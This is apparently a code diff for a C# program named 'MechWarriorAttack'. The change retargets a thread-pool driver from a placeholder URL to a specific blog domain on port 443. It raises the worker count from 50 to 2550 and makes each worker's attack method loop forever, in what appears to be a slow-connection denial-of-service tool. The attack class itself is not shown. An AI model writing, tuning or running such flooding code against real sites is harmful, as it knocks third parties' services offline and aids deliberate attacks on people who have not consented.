@@ -11,18 +11,19 @@ namespace MechWarriorAttack
             Console.WriteLine("Hello World!");
             CancellationTokenSource tsource = new();
             int SomePort = 443; //443 for https, 80 for http
-            for (int i = 0; i < 50; i++)
+            for (int i = 0; i < 2550; i++)
             {
-                MechManager.AddWork(new WaitCallback(Test), new SlowWiggie("the url with http:// or ip",SomePort,10000)
+                SlowWiggie state = new SlowWiggie("somebullshitblogthathates.com", SomePort, 3000, true)
                 {
                     ThreadName = $"Test {i}",
                     Cancel = tsource.Token,
 
 
-                });
+                };
+                MechManager.AddWork(new WaitCallback(RunBoomer), state);
             }
     
-            int Iterations = 0;
+   
             while (MechManager.WorkInProgress)
             {
                 Thread.Sleep(1200);
@@ -35,12 +36,15 @@ namespace MechWarriorAttack
             }
 
         }
-        static void Test(object? stater)
+        static void RunBoomer(object? stater)
         {
             var state = (MechState)stater;
             state.WorkStartTime = DateTime.Now;
             state.WorkStarted = true;
-            state.FuckEmThatsWhy();            
+            while (true)
+            {
+                state.FuckEmThatsWhy();
+            }
             state.Complete = true;
             state.Success = true;
         }
